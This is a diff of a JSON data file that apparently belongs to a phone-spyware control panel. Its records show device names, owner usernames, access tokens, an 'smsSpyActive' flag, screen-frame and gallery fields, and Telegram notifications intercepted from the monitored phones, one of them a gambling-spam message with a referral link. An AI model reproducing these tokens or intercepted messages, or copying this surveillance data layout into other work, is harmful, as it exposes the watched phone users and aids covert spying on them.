@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776772466721,
+    "lastSeen": 1776772476392,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776772465862,
+    "lastSeen": 1776772475129,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776772465530,
+    "lastSeen": 1776772474769,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5820 pesan baru dari 48 obrolan",
+        "time": "21/04 18:54",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776772476393
+      },
       {
         "appName": "Telegram",
         "sender": "GB PUBLIC FREE PANEL: #K— Of̶ 𐌕 Cōu̶rsēe. 𐍉",
@@ -14394,14 +14402,6 @@
         "time": "21/04 18:12",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776769979606
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
-        "content": "🕯📈HIGHEST DEPOSIT KARKE READy Raho! 💯\n\nRegister Link 🔗👇\nhttps://www.jaiclub35.com/#/register?invitationCode=37557112869\n\n⚠️ Jo Bhi New Member ho Yah Video Dekh Lo Kaise Khelna Hai Samajh Jaaoge ⚠️",
-        "time": "21/04 18:12",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769964032
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776772467054,
+    "lastSeen": 1776772476195,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
